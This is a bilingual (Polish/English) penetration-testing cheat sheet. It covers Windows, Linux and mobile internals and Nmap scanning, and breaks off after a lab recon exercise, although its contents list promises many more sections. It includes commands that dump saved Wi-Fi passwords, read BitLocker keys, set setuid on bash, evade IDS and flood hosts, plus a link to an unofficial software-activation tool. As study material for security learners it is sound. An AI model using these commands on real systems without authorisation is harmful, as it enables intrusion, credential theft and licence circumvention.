# Spis treści

- [Cyber Kill Chain](#cyber-kill-chain)
- [Operating systems](#operating-systems)
  - [Windows](#windows)
  - [Linux](#linux)
  - [Android](#android)
  - [iOS](#ios)
  - [Cloud](#cloud)
- [Vulnerability Scanning](#vulnerability-scanning)
  - [Nmap](#nmap)
  - [Smap](#smap)
  - [RustScan](#rustscan)
  - [Burp Suite](#burp-suite)
  - [Zed Attack Proxy (ZAP)](#zed-attack-proxy-zap)
  - [SQLmap](#sqlmap)
  - [Dirb/Gobuster](#dirb/gobuster)
  - [Kube-hunter](#kube-hunter)
  - [ScoutSuite](#scoutsuite)
- [Exploitation and Payload Delivery](#exploitation-and-payload-delivery)
  - [Metasploit](#metasploit)
  - [Empire](#empire)
  - [BLACKEYE](#blackeye)
  - [SET (Social-Engineer Toolkit)](#set-social-engineer-toolkit)
  - [BeEF](#beef)
- [Post-Exploitation and Privilege Escalation](#post-exploitation-and-privilege-escalation)
  - [Mimikatz](#mimikatz)
  - [LinPEAS/WinPEAS](#linpeas/winpeas)
  - [GTFOBins/LOLBAS](#gtfobins/lolbas)
  - [Iodine](#iodine)
- [Command & Control](#command-&-control)
- [OSINT (Open Source Intelligence)](#osint-open-source-intelligence)
  - [OSINT Framework](#osint-framework)
  - [Maltego](#maltego)
  - [SpiderFoot](#spiderfoot)
  - [Shodan](#shodan)
  - [theHarvester](#theharvester)
  - [Recon-ng](#recon-ng)
  - [FOCA (Fingerprinting Organizations with Collected Archives)](#foca-fingerprinting-organizations-with-collected-archives)
  - [Cyotek WebCopy](#cyotek-webcopy)
- [WiFi Security](#wifi-security)
  - [Aircrack-ng](#aircrack-ng)
  - [Kismet](#kismet)
- [Active Directory Security](#active-directory-security)
- [Containerization (Docker) Security](#containerization-docker-security)
  - [Trivy](#trivy)
- [Antivirus Software](#antivirus-software)
- [DDoS Attack](#ddos-attack)
- [IDS (Intrusion Detection and Prevention Systems)](#ids-intrusion-detection-and-prevention-systems)
  - [Snort](#snort)
  - [Modsecurity](#modsecurity)
  - [Wazuh](#wazuh)
- [Reverse Engineering and Malware Analysis](#reverse-engineering-and-malware-analysis)
  - [Cheat Engine](#cheat-engine)
  - [Ghidra](#ghidra)
  - [x64dbg](#x64dbg)
  - [HxD](#hxd)
  - [Cutter](#cutter)
  - [ReClass.NET](#reclass.net)
  - [API Monitor](#api-monitor)
  - [Crackmes](#crackmes)
  - [IDA Pro](#ida-pro)
  - [Radare2](#radare2)
  - [Binary Ninja](#binary-ninja)
  - [PEStudio](#pestudio)
  - [YARA](#yara)
  - [Cuckoo Sandbox](#cuckoo-sandbox)
  - [ANY.RUN](#any.run)
  - [Hybrid Analysis](#hybrid-analysis)
  - [VirusTotal](#virustotal)
- [Forensics and Incident Response](#forensics-and-incident-response)
  - [Autopsy](#autopsy)
  - [Volatility](#volatility)
  - [Sleuth Kit](#sleuth-kit)
  - [FTK Imager](#ftk-imager)
- [Password Cracking and Hashing](#password-cracking-and-hashing)
  - [John the Ripper](#john-the-ripper)
  - [Hashcat](#hashcat)
  - [Hydra](#hydra)
- [Phishing](#phishing)
- [Network Security and Traffic Analysis](#network-security-and-traffic-analysis)
  - [Wireshark](#wireshark)
  - [Tshark](#tshark)
  - [ngrep](#ngrep)
  - [fragroute](#fragroute)
  - [ProxyChains](#proxychains)
  - [SSLStrip](#sslstrip)
  - [iperf](#iperf)
  - [ike-scan](#ike-scan)
  - [ThreatCheck](#threatcheck)
  - [tcpreplay](#tcpreplay)
  - [ngrem](#ngrem)
  - [Network Miner](#network-miner)
  - [Netcat](#netcat)
  - [Snorby](#snorby)
  - [tcpxtract](#tcpxtract)
  - [hping3](#hping3)
  - [tcpdump](#tcpdump)
  - [Ettercap](#ettercap)
  - [Bettercap](#bettercap)
  - [Scapy](#scapy)
- [Development and Productivity Tools](#development-and-productivity-tools)
  - [Visual Studio Code](#visual-studio-code)
  - [Tmux](#tmux)
  - [Arduino IDE](#arduino-ide)
  - [DB Browser (SQLite)](#db-browser-sqlite)
  - [draw.io](#draw.io)
  - [MobaXterm](#mobaxterm)
  - [WinMerge](#winmerge)
  - [7zip](#7zip)
- [Hardware Tools](#hardware-tools)
- [Cyber News Hub](#cyber-news-hub)
- [Sample penetration tests](#sample-penetration-tests)
- [TODO Learn/Read](#todo-learn/read)

# Cyber Kill Chain

Attack phases:
1. Reconnaissance
2. Weaponization
3. Delivery
4. Exploitation
5. Installation
6. Command & Control
7. Actions on Objective

# Operating Systems

## Windows

### Aktywacja Windows i Office - https://massgrave.dev/

Always open command prompt in admninistrator Mode
```bash
runas /user:Administrator cmd
powershell -Command "Start-Process cmd -Verb RunAs"
```
Hide zip or rar files inside an image
```bash
copy /b image.extension+folder.zip image.extension
```
Encrypt files in a folder
```bash
cipher /E
```
Hide/unhide a folder from everyone
```bash
attrib +h +s +r foldername
attrib -h -s -r foldername
```
Show all wifi passwords
```bash
netsh wlan show profile
netsh wlan show profile wifinetwork key=clear | findstr “Key Content”
for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @if "%j" NEQ "" (echo SSID: %j & netsh wlan show profiles %j key=clear | findstr "Key Content") & echo.
```
Create a batch file
```bash
for /F "tokens=2 delims=:" %a in ('netsh wlan show profile') do @(set wifi_pwd= & for /F "tokens=2 delims=: usebackq" %F IN (`netsh wlan show profile %a key^=clear ^| find "Key Content"`) do @(set wifi_pwd=%F) & echo %a : !wifi_pwd!)
```
Display detailed system operating and configuration info
```bash
systeminfo
```
Get MAC addresses for all devices
```bash
getmac -v
```
Securely Copy files between remote hosts
```bash
scp file.txt root@serverip:~/file.txt
```
Open CMD inside a windows directory
```bash
“CMD” in the search bar
```
Open Explorer from the windows command prompt
```bash
explorer.
```
Map a regular folder as a mounted drive
```bash
subst q: c://filelocation
```
Remove the Mounted Drive
```bash
subst /d q:
```
Change the Background and Text color in command prompt
```bash
color 07 [background:text]
```
Change the Prompt Text
```bash
prompt {text}$G
```
Reset the Prompt Text
```bash
prompt
```
Change the Title of command prompt window
```bash
title {stuff}
```
Delete Temporary Files to Clear Space
```bash
del /q /f /s %temp%\\*
del /s /q C:\\Windows\\temp\*
```
History of Commands
```bash
doskey / history
```
Use Windows Terminal Instead of Command Prompt:
1. Download and install Windows Terminal from the Microsoft Store or GitHub.
2. Launch Windows Terminal.
3. Click on the down arrow icon at the top of the window, next to the plus sign, and select "Settings".
4. In the "Settings" window, find the "defaultProfile" setting and set its value to the GUID of the terminal you want to use as the default (e.g. PowerShell, Command Prompt, or WSL).
5. Save the settings and close the "Settings" window.
6. To open a new terminal window, press "Ctrl+Shift+T" or click on the plus sign in the tab bar and select the terminal you want to open.
7. Using Windows Terminal, You Can Drag and Drop Files to the Terminal When You Need the File Location

Szukanie plików i katalogów o danej nazwie
```bash
Get-ChildItem -Path C:\ -Recurse -Filter "NTDS.DIT" -ErrorAction SilentlyContinue
```
Wyświetlenie tablicy rootingu - znane sieci danego komputera
```bash
route print
```
Dodanie do tablicy routingu (do jakiej sieci i z jaką mashą i nasz adres ip)
```bash
route add 192.168.10.0 MASK 255.255.255.0 192.168.0.15
```
Usuwanie z tablicy routingu
```bash
route DELETE xxx.xxx.xxx.xxx
```
Zwolnienie aktualnego adresu IP przypisanego przeez serwer DHCP, a następnie zażądanie od serwera DHCP adresu IP
```bash
ipconfig /release
ipconfig /renew
```
Lokalizacja pliku hosts
```bash
C:\Windows\System32\drivers\etc
```
Wyświetlenie zapisanych DNS i wyczyszczenie tej listy
```bash
ipconfig /displaydns
ipconfig /flushdns
```
Displaying active network connections, listening ports, and associated process IDs (PIDs)
```bash
netstat -ano
```
Lokalizacja haseł lokalnych użytkowników i sposób ich odczytania
```bash
%SystemRoot%\System32\config\SAM
https://www.youtube.com/watch?v=L26Xq7m0uQ0
"Password Cracking of Windows Operating System.pdf"
```
Przydatne dodatki (plik do pobrania standalone)
```bash
procexp.exe - Eksplorator procesów
https://www.nirsoft.net/ - kolekcja małych i przydatnych darmowych narzędzi (FullEventLogView / WinPrefetchView)
https://www.shadowexplorer.com/ - allows you to browse the Shadow Copies created by Windows
https://ericzimmerman.github.io/#!index.md - kolejny zbiór małych i przydatnych darmowych narzędzi (AmcacheParser / RECmd / ShellBags Explorer / AppCompatCacheParser)
MediaCreationTool22H2.exe
```
Stworzenie katalogów o podanej nazwie daje odpowiedni skrót
```bash
GodMode.{ED7BA470-8E54-465E-825C-99712043E01C}
MyComputer.{20D04FE0-3AEA-1069-A2D8-08002B30309D}
WinVault.{1206F5F1-0569-412C-8FEC-3204630DFB70}
Firewall.{4026492F-2F69-46B8-B9BF-5654FC07E423}
Network.{208D2C60-3AEA-1069-A2D7-08002B30309D}
NetworkedProgrammInstall.{15eae92e-f17a-4431-9f28-805e482dafd4}
Wireless.{1FA9085F-25A2-489B-85D4-86326EEDCD87}
RDPConnections.{241D7C96-F8BF-4F85-B01F-E2B043341A4B}
Printers.{2227A280-3AEA-1069-A2DE-08002B30309D}
```
By wejść do BIOS wystarczy zrobić restart z przytrzymanym przyciskiem Shift

Open the Stored User Names and Passwords management interface
```bash
rundll32.exe keymgr.dll, KRShowKeyMgr
```
Sprawdzenie, czy jest zaszyfrowany dysk BitLocker
```bash
manage-bde -status
```
Obejście BitLockera
```bash
Podczas aktualizacji systemu, BitLocker uruchamia poniższa komendę na czas update/restartu co sprawia, że udostępnia klucz szyfrujący w postaci jawnego tekstu:
Suspend-BitLocker -MountPoint "C:" -RebootCount 1   (jak damy 0 to na nieskończoną ilość rozruchów wyłączy szyfrowanie)
BitLocker szyfruje dysk kluczami, które Microsoft nazwał sobie po swojemu:
FVEK <--- VMK <--- KP
Taki dysk możemy podłączyć pod maszynę z Linux i sprawdzić w jakim stanie jest nasz BitLocker
bdeinfo /dev/xvdb2
Wtedy możemy zobaczyć Key protector 2 jako type Clear Key - czyli zapisany w postaci jawnego tekstu
Możemy ten dysk sobie zamontować:
bdemount /dev/xvdb2 /mnt/fuser/
mount -o loop,ro /mnt/fuser/bde1 /mnt/bitunlocker/
ls -alF m/mnt/bitunlocker/
W tym trybie możemy odczytać nawet główny klucz szyfrujący FVEK i mając go nie będziemy potrzebować hasła do odszyfrowania później dysku:
dislocker -vvvv -V /dev/xvdb2
```
Do wykonywania kluczowych operacji, Windows wykorzystuje bibliotekę NTDLL (ntdll.dll). Zawiera ona zbiór funkcji i wywołań systemowych (natywne API Windowsa) niezbędnych do prawidłowego funkcjonowania procesów i aplikacji. Działa jako interfejs pomiędzy oprogramowaniem, a komponentami sprzętowymi komputera. Przykład:
```bash
Przykład: NTDLL unhooking
NtOpenProcess - (otwarcie procesu)
NtAllocateVirtualMemory - (zaalokowanie obszaru pamięci)
NtWriteVirtualMemory - (zapisanie do pamięci)
NtCreateThreadEx - (wykonanie wątku w zdalnym procesie)
```
Eskalacja uprawnień w Windows
```bash
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
```

https://kapitanhack.pl/2023/06/30/nieskategoryzowane/co-nowego-w-microsoft-sysmon-v15-ciekawostki-dla-threat-hunterow/
https://learn.microsoft.com/en-us/windows/privacy/diagnostic-data-viewer-overview
https://learn.microsoft.com/pl-pl/sysinternals/downloads/sysmon
Microsoft PowerToys

## Linux

https://explainshell.com/

Sends ICMP echo requests to 192.168.0.1 to check connectivity and measure response time. Used in ethical hacking for initial reconnaissance to verify if the target system is reachable.
```bash
ping 192.168.0.1
```
This command sends ICMP echo requests with a packet size of 1300 bytes to 172.18.0.11. It's useful for testing how a network or host handles larger packets, which could help in identifying misconfigurations or vulnerabilities related to fragmentation.
```bash
ping -s 1300 172.18.0.11
```
Sends flood pings with large packets (1300 bytes) to 172.18.0.11. The f option sends packets as fast as possible, which can be used to stress test the network components of the target and check for DoS vulnerabilities.
```bash
ping -s 1300 -f 172.18.0.11
```
Displays bandwidth usage on network interfaces in real-time. Ethical hackers use it to monitor network traffic for anomalies that could indicate malicious activity or to assess the impact of their testing on network bandwidth.
```bash
iftop
```
Establishes a tunnel encapsulated within ICMP echo requests and replies. Ethical hackers might use this to bypass network restrictions or for covert communications during penetration testing.
```bash
ptunnel
```
Searches recursively (r), ignoring case (i), and in all files from the current directory for the string "tree", showing line numbers (n) and file names (H). The output is then piped into vim for editing. This could be used to search through code or configuration files for specific entries related to vulnerabilities or configurations.
```bash
grep -Hnri 'tree' | vim -
```
This command is used within vim, the text editor, to sort the lines of the currently open file. It can be useful for organizing data, such as IP addresses or URLs, during the analysis phase of ethical hacking.
```bash
:%!sort
```
Another vim command that filters out lines containing .git from the currently open file, using grep -v which inverts the match. This can be helpful to exclude version control directories from text search results in configuration or documentation files.
```bash
:%!grep -v .git
```
Scans 10.77.14.0/24 for open ports 80, 443, and 22 at a rate of 1000 packets per second. Masscan is used for very fast scans over large networks or subnets.
```bash
masscan -p80,443,22 10.77.14.0/24 --rate=1000
```
Scans the entire 10.0.0.0/8 range for all possible ports at a high packet rate, demonstrating Masscan's capability for rapid, wide-scale scanning.
```bash
masscan 10.0.0.0/8 -p0-65535 --rate=10000
```
Scans the entire 10.0.0.0/8 range for all possible ports at a high packet rate, demonstrating Masscan's capability for rapid, wide-scale scanning.
```bash
masscan -p80,443 10.0.0.0/8 --rate=1000 --randomize-hosts
```
Specifically targets port 23 (Telnet) across the 10.0.0.0/8 range at a high rate. It's used for quickly identifying potentially vulnerable Telnet services.
```bash
masscan -p23 10.0.0.0/8 --rate=10000
```
A playful command that shows a steam locomotive animation across the terminal. While not directly related to ethical hacking, it can be a humorous way to remind oneself or others not to mistype ls for listing directory contents.
```bash
sl
```
Sets an alias for the ls command to execute cat /dev/urandom instead, causing random data to be displayed whenever ls is typed. This command is more of a practical joke and should be used cautiously, as it overrides the default behavior of a commonly used command.
```bash
alias ls="cat /dev/urandom"
```
Retrieves WHOIS information for microsoft.com, providing details like registration, ownership, and administrative contacts. Used in reconnaissance for gathering intelligence about domain ownership.
```bash
whois microsoft.com
host microsoft.com
dig a +short microsoft.com
dig mx microsoft.com
```
Identifies technologies used on the networkchuck.coffee website, such as web server software, CMS, JavaScript libraries, etc. It's useful for pre-attack planning by identifying potential software vulnerabilities.
```bash
whatweb networkchuck.coffee
```
Sends a HTTP GET request to https://networkchuck.hackwithnahamsec.com, displaying the full HTTP response headers (i option). This command is useful for web reconnaissance, allowing ethical hackers to gather information about the web server, including software versions and cookies.
```bash
curl -i <https://networkchuck.hackwithnahamsec.com>
```
Sends a HTTP GET request with a custom header X-API-TOKEN for authentication. This is often used in API testing to ensure that protected endpoints are secure and accessible only with correct authentication tokens.
```bash
curl -i <https://networkchuck.hackwithnahamsec.com> -H 'X-API-TOKEN: <api token>'
```
Performs a comprehensive web server scan against networkchuck.coffee to detect dangerous files, outdated server software, and other vulnerabilities. Nikto is used for web application security testing.
```bash
nikto networkchuck.coffee
```
Uses brute force to enumerate directories and files on https://networkchuck.com using a specific wordlist. Gobuster helps find hidden resources that were not intended to be publicly accessible.
```bash
gobuster dir -u <https://networkchuck.com> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```
Installs the seclists package, which contains a collection of pre-compiled wordlists for different security assessments including passwords, fuzzing payloads, and directories enumeration.
```bash
apt install seclists
```
Downloads a specific DNS enumeration wordlist from the SecLists GitHub repository. This wordlist is used for discovering subdomains and other DNS related reconnaissance.
```bash
wget <https://github.com/danielmiessler/SecLists/raw/master/Discovery/DNS/dns-Jhaddix.txt>
```
Conducts DNS subdomain enumeration on networkchuck.com using the dns-Jhaddix.txt wordlist. It's a method for discovering subdomains that might reveal additional attack surfaces.
```bash
gobuster dns -d networkchuck.com -w dns-jhaddix.txt
```
A tool used for fast subdomain enumeration, gathering data from search engines, websites, and DNS servers. It helps in uncovering additional domains associated with the target for further exploration and vulnerability assessment.
```bash
sublist3r
```
Scans the WordPress site at chuckkeith.com for user enumeration, attempting to list user accounts. This information can be used for brute force attacks or phishing campaigns.
```bash
wpscan --url chuckkeith.com --enumerate u
```
This command uses WPScan, a WordPress vulnerability scanner, to enumerate installed plugins on the website chuckkeith.com. This is crucial for ethical hackers to identify potentially vulnerable plugins that could be exploited.
```bash
wpscan --url chuckkeith.com --enumerate p
```
Runs WPScan against http://example.com to aggressively enumerate vulnerable plugins (vp) and themes (vt), potentially uncovering security weaknesses. The aggressive detection mode increases the chance of finding hidden or less obvious components.
```bash
wpscan --url <http://example.com> --enumerate vp,vt --plugins-detection aggressive
```
Executes a passive domain enumeration for example.com using the Amass tool. This method gathers information without directly interacting with the target's web servers, reducing the risk of detection. It's useful for mapping out a target's external attack surface.
```bash
amass enum -passive -d example.com
```
This entry refers to using Git, a version control system, for cloning repositories such as exploit databases or tools useful in ethical hacking. For example, cloning a repository of exploits can provide an ethical hacker with resources to test systems for vulnerabilities.
```bash
git
```
A command-line search tool for Exploit Database, allowing users to search for known vulnerabilities and exploits. Ethical hackers use it to find exploits for identified vulnerabilities in systems or applications. Commands like searchsploit wordpress plugins or searchsploit ssh are examples of how it can be used to narrow down searches for specific targets.
```bash
searchsploit
```
Invokes a new Bash shell with the p option, which preserves the effective UID and GID privileges. This can be used in privilege escalation scenarios when a script or program with setuid is exploited to retain elevated privileges.
```bash
/bin/bash -p
```
Applies the setuid bit (+s) on /bin/bash, making it run with the privileges of the file's owner (typically root) for any user who executes it. This command is a classic example of a privilege escalation technique, allowing a low-privileged user to gain root access through a new shell instance.
```bash
sudo chmod +s /bin/bash
```
Show the kernel's ARP cache
```bash
arp -a
```
Usuń wszystkie wpisy dla wszystkich hostów (ARP)
```bash
arp -d * 
```
Initiates an SSH connection to 192.168.1.1 with the username networkchuck. SSH is used by ethical hackers for secure, encrypted communications with targets during assessments or for establishing secure channels for further exploitation.
```bash
ssh networkchuck@192.168.1.1
```
Executes a specific command on remote_host via SSH as user. This allows ethical hackers to remotely execute commands on a target system, which can be part of exploitation or post-exploitation phases.
```bash
ssh user@remote_host 'command_to_run'
```
Establishes an SSH connection to 172.234.88.97 as root, creating a dynamic SOCKS proxy on local port 1337 (D 1337), with compression (C), in quiet mode (q), without executing a remote command (N). This can be used for secure, anonymous browsing through the target, or to bypass network restrictions during ethical hacking assessments.
```bash
ssh -D 1337 -C -q -N root@172.234.88.97
```
100% pewności, że dane z dysku/pendrive itd. zostaną zrzucone i po tym można bez problemu np. wyjąć pendrive
```bash
sync
```
Możliwość podniesienia uprawnień modyfikując plik
```bash
sudo nano /etc/group 
```
ID procesu
```bash
pgrep passwd
```
Reset powłoki
```bash
reset
```
```bash
jobs
```
Jakie urzadzenia były podlaczony do maszyny
```bash
grep SerialNumber /var/log/syslog
```
Operacje na pliku passwd
```bash
grep bash passwd | wc -l
cut -d : -f 1 passwd
cut -d : -f 3 passwd | sort -n
tail -n 3 passwd
cut -d : -f 3 passwd | sort -n | tail -n 3
wc -l passwd
```
Wyświetl wszystkie zmienne środowiskowe
```bash
echo $ <tab> <tab>
```
Informacja o danym pliku wykonywalnym
```bash
type -a pwd
```
Możliwość modyfikacji konfiguracji sieciowej w pliku
```bash
nano /etc/network/interfaces
systemctl restart network.service
nano /etc/resolv.conf
```
Jakie komendy mogę wykonywać jako root
```bash
sudo -l
```

## Android

APKLeaks
https://developer.android.com/guide/topics/manifest/manifest-intro?hl=pl
https://sekurak.pl/drozer-narzedzie-do-analizy-aplikacji-mobilnych-android/
https://sekurak.pl/rootowanie-androida-od-wersji-1-0-wszystko-dzieki-dirty-cow-do-pobrania-poc/

Bootowanie systemu:
1. BootROM - oprogramowanie read-only, zahardkodowane w chipie, stanowiące początek root-of-trust. (Teoretycznie) niemodyfikowalne.
2. Bootloader - oprogramowanie wgrywane przez producenta urządzenia- nie należy do systemu Android. Do jego głównych funkcji należy, między innymi wskazanie lokalizacji uruchamianego systemu operacyjnego, wczytanie jądra Linux oraz uruchomienie tzw. Trusted Execution Environment (TEE)
Odblokowanie bootloadera? Wyłączenie funkcji weryfikacji podpisu wczytywanego oprograwowania Jeden z elementów kluczowych do (prostego) zrootowania urządzenia
3. Kernel - Program stanowiący główną warstwę pomiędzy systemem operacyjnym a fizycznymi komponentami smartfonu. Zarządza ono podstawowymi zasobami oraz funkcjonalnościami systemu - procesami, pamięcią, systemami plików, kontrolą uprawnień, itd.. System Android bazuje na jądrze Linux 
4. Init
https://android.googlesource.com/platform/system/core/+/master/init/README.md
https://community.nxp.com/t5/i-MX-Processors-Knowledge-Base/What-is-inside-the-init-rc-and-what-is-it-used-for/ta-p/1106360
Pierwszy kluczowy program systemu Android. Definiuje on podstawowe czynności wykonywane podczas inicjalizacji systemu, oraz definiuje podstawowe katalogi. Wczytuje pliki konfiguracyjne zewnętrznych usług systemowych obsługujących np. bluetooth czy kartę sieciową
5. Zygota - Zarządzanie uruchamianiem aplikacji na telefonie. Działa w modelu klient - serwer. Nowe aplikacje uruchamiane są poprzez odwołanie do gniazda /dev/socket/zygote. Każda aplikacja uruchomiona na urządzeniu jest rozwidleniem podstawowego procesu Zygoty.
6. System - Podstawowe usługi systemowe wczytywane są przez proces SystemServer. Nowe aplikacje uruchamiane są poprzez odwołanie do gniazda /dev/socket/zygote. Każda aplikacja uruchomiona na urządzeniu jest rozwidleniem podstawowego procesu Zygoty.

SELinux:
Ścisłe zdefiniowanie uprawnień danego procesu oraz wyłączenie dostępu do nadmiarowych funkcjonalności.
Uprawnienia zdefiniowane z wykorzystaniem polityk Mandatory Access Control (MAC).
Polityki znajdują się w folderze: /system/etc/selinux/
Podglądanie reguł SELinux w adb logcat:
adb logcat | grep "avc:"
https://source.android.com/docs/security/features/selinux/validate?hl=pl

Sandbox:
Każda zainstalowana aplikacja, działa jako oddzielny użytkownik w systemie.
Domyślny dostęp wyłącznie do katalogu "domowego" + podstawowych usług systemowych.

Szyfrowanie danych:
1. Dawniej: FDE (Full Disk Encryption) - Android 5.0 - 9.0
2. Aktualnie: FBE (File Based Encryption) - Android 10.0 +
https://developer.android.com/training/articles/direct-boot#:~:text=credential%20encrypted%20storage.-,Access%20device%20encrypted%20storage,-To%20access%20device

Root (Android):
Wymagane odblokowanie bootloadera
Najpopularniejsze rozwiązanie: Magisk
Modyfikacja obrazu systemu wczytywanego podczas uruchamiania urządzenia- boot.img

Android - tryb debug

Android - co dzieje się po uruchomieniu systemu?
1. BootROM - oprogramowanie read-only, zahardkodowane w chipie, stanowiące początek root-of-trust.
(Teoretycznie) 2. Bootloader - oprogramowanie wgrywane przez producenta urządzenia- nie należy do
systemu Android. Do jego głównych funkcji należy, między innymi wskazanie lokalizacji uruchamianego
systemu operacyjnego, wczytanie jądra Linux oraz uruchomienie tzw. Trusted Execution Environment
(TEE). Inna nazwa - Trusty.
Trusty - dokumentacja: https://source.android.com/security/trusty?hl=en
Odblokowanie bootloadera = Wyłączenie funkcji weryfikacji podpisu wczytywanego oprograwowania.
Kluczowy krok podczas procesu rootowania telefonu, czyli uzyskiwania dostępu do powłoki jako user root!
2. Wczytanie jądra systemu, bazującego na Linux. Zarządza ono podstawowymi zasobami oraz
funkcjonalnościami systemu - procesami, pamięcią, systemami plików, kontrolą uprawnień, itd..
3. Wczytanie kluczowych usług systemowych poprzez pierwszy proces- init. Definiuje on podstawowe
czynności wykonywane podczas inicjalizacji systemu, oraz podstawowe katalogi.
4. Zygota- proces w modelu klient serwer. Każda aplikacja uruchomiona na urządzeniu jest rozwidleniem
podstawowego procesu Zygoty. Nowe aplikacje uruchamiane są poprzez odwołanie do gniazda
/dev/socket/zygote
5. Wczytanie UI i pozostałych elementów systemu.
Wyświetlenie logów urządzenia - adb logcat
Wyświetlenie logów SystemServer (uruchamianego w kroku 6) - adb logcat |grep SystemServer

Android - główne mechanizmy systemu gwarantujące bezpieczeństwo
1. SELinux:
Ścisłe zdefiniowanie uprawnień danego procesu oraz wyłączenie dostępu do nadmiarowych
funkcjonalności
Uprawnienia zdefiniowane z wykorzystaniem polityk Mandatory Access Control (MAC).
Polityki znajdują się w folderze: /system/etc/selinux/
Podglądanie reguł SELinux w adb logcat: adb logcat | grep "avc:"
1. Sandbox:
Każda zainstalowana aplikacja, działa jako oddzielny użytkownik w systemie.
Domyślny dostęp wyłącznie do katalogu "domowego" + podstawowych usług systemowych
1. Szyfrowanie danych:
W starszych wersjach Android (Android 5.0 - 9.0) - szyfrowanie bazujące na jednym kluczu do wszystkiego
- FDE (Full Disk Encryption). Z tego powodu - problem z działaniem usług przed pierwszym
odblokowaniem telefonu po ponownym uruchomieniu.
W Android 10+ - każdy plik szyfrowany osobnym kluczem - FBE (File Based Encryption). Wprowadzone
dwa rodzaje pamięci - Device Encrypted Storage - w którym przechowywane są dane które powinny być
dostępne przed pierwszym odblokowaniem po ponownym uruchomieniu smartfonu (i są szyfrowane z
wykorzystaniem kluczy bazujących na unikalnym ID telefonu- UID) oraz Credential Encrypted Storage -
tutaj znajdują się dane które powinny być dostępne po pierwszym odblokowaniu telefonu (szyfrowane z
wykorzystaniem kluczy bazujących na UID + PIN odblokowania telefonu).
Aplikacja do rootowania smartfonu Android i zarządzania rootem - Magisk
(https://github.com/topjohnwu/Magisk)

## iOS

iOS - co dzieje się po uruchomieniu systemu?
1. BootROM - oprogramowanie read-only, zahardkodowane w chipie, stanowiące początek root-of-trust.
(Teoretycznie) niemodyfikowalne.
2. LLB - w starszych procesorach, krok przejściowy przed uruchomieniem iBoot (bootloadera). Wykonuje
operacje rozruchowe oraz sprawdza podpis kolejnego procesu.
3. iBoot- tzw. second-stage bootloader. Służy do wczytania samego systemu operacyjnego. Z tego poziomu
można wejść do trybu Recovery.
4. Kernel- wczytanie systemu operacyjnego iOS, czyli BSD UNIX-like.
5. Wczytanie pozostałych komponentów iOS.

iOS - główne mechanizmy systemu gwarantujące bezpieczeństwo
1. Secure Enclave:
Dodatkowy, równoległy koprocesor, izolowany od pozostałych komponentów, i zwyczajnego procesora
Stworzony w celu bezpiecznego przechowywania wrażliwych danych o urządzeniu, nawet gdy procesor
aplikacji zostanie skompromitowany
Obsługiwany przez dedykowany niskopoziomowy system, sepOS
1. Sandbox:
Każda aplikacja posiada swój oddzielny kontener, izolowany od pozostałych
W odróżnieniu od androida, wszystkie aplikacje instalowane są przez użytkownika installd_ oraz
uruchamiane przez użytkownika mobile
1. Data Protection Classes - programista ma możliwość zdefiniowania poziomu szyfrowania plików aplikacji.
Aktualnie, aby zjailbreakować smartfon z iOS (czyli uzyskać w nim uprawnienia root), konieczne jest
wykorzystanie jednego z exploitów na eskalację uprawnień. Działające programy do jailbreakowania, to
Checkrain (https://checkra.in/) oraz Unc0ver (https://unc0ver.dev/) (iOS do 15). W wersji 15+ aktualnie działa
poprawnie Palera1n (https://github.com/palera1n/palera1n)
Jedna z firm zajmujących się skupowaniem błędów typu 0day do tworzenia zaawansowanego oprogramowania
szpiegowskiego - Zerodium:
https://zerodium.com/program.html
Comiesięczny biuletyn bezpieczeństwa Android: https://source.android.com/docs/security/bulletin/2022-06-
01?hl=pl

## Cloud

https://github.com/RhinoSecurityLabs/cloudgoat
https://rzepsky.medium.com/

# Vulnerability Scanning

## Nmap

Performs a ping scan on the 192.168.1.0/24 subnet, identifying live hosts without actually scanning ports. It's a basic reconnaissance tool for mapping network structure.
```bash
nmap -sn 192.168.1.0/24
```
Scans `192.168.1.1` to identify service versions on open ports. This information is crucial for discovering vulnerable software versions that can be exploited.
```bash
nmap -sV 192.168.1.1
```
Attempts to identify the operating system of 192.168.1.1 based on characteristics of its network behaviors. This helps in tailoring further attacks to the specific OS vulnerabilities.
```bash
nmap -O 192.168.1.1
```
Scans 192.168.1.1 without trying to ping it first, useful when the target may be blocking ICMP echo requests. It allows for stealthier scanning.
```bash
nmap -Pn 192.168.1.1
```
Lists each IP in the 192.168.1.0/24 subnet without sending any packets to them. It's used for planning or documentation purposes, especially in large networks.
```bash
nmap -sL 192.168.1.0/24
```
Executes Nmap's vulnerability detection scripts against 192.168.1.1. This automated approach helps identify known vulnerabilities that can be exploited.
```bash
nmap --script vuln 192.168.1.1
```
Scans 192.168.1.1 with Nmap scripts designed to detect malware infections. It's a quick way to check if a host is compromised.
```bash
nmap --script malware 192.168.1.1
```
Performs an aggressive scan on 192.168.1.1 that includes OS and version detection, script scanning, and traceroute. It's a comprehensive scan for gathering detailed information about a target.
```bash
nmap -A 192.168.1.1
```
Scans the 192.168.1.0/24 subnet with fragmented packets, which can help evade some IDS/IPS systems. It's used for stealthier scanning.
```bash
nmap -f 192.168.1.0/24
```
Scans 192.168.1.0/24 using a source port of 53, mimicking DNS traffic. This can bypass certain firewall rules that allow DNS traffic.
```bash
nmap --source-port 53 192.168.1.0/24
```
Scans 192.168.1.0/24 using decoy traffic from random IPs (RND:10), making it difficult to identify the true source of the scan. It's used for anonymizing the scan source.
```bash
nmap -D RND:10 192.168.1.0/24
```

Wykrycie usług, identyfikacja typu usługi, wersji, oprogramowania, ukrytych plików.
W przypadku ograniczonej liczby usług - nmap
Gdy sieć jest rozległa - masscan + nmap

Krok 1. Zbierz informację o aktywnych hostach. Wynik zaimportuj do metasploit
nmap -sn
Krok 2. Znajdź otwarte porty. Wynik zaimportuj do Metasploit
masscan -Pn --rate=2000
Krok 3. Zgromadź informację o usługach i systemie (banery)
nmap -sV -O
db_nmap -sV -O
Krok 4. Sprawdź manualnie, jakie to usługi:
nc
burp
curl
telnet
Krok 5. Odkryj interesujące ścieżki w serwerach webowych:
ffuf
feroxbuster
Krok 6. RECON
Podatne usługi? Pliki z nadmiarowymi informacjami? Usługi źle skonfigurowane?
1. Zlokalizuj w lokalnej sieci LAB usługę na porcie pomiędzy 5000 - 7000 (TCP)
2. Podłącz się do niej, i daj znać co to za usługa. Spróbuj pobrać istotne informacje
3. Spróbuj znaleźć informację o podatnościach w tej usłudze (cvedetails, "<usługa> intitle:poc site:github.com" itd)
4. Wykonaj RCE (podpowiedź - notatnik!)

